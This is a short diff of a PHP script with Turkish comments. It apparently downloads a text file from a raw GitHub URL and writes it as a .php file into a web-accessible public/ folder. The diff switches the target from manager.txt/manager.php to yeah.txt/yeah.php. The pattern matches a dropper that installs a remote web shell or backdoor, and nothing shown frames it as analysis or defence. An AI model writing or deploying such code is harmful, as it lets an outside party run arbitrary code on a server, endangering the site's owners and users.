@@ -1,11 +1,11 @@
 
 <?php
 // Hedef URL
-$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt";
+$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt";
 
 // İndirilecek dosya yolu
 $targetDir = __DIR__ . '/public/';
-$targetFile = $targetDir . 'manager.php';
+$targetFile = $targetDir . 'yeah.php';
 
 // Eğer hedef klasör yoksa oluştur
 if (!is_dir($targetDir)) {
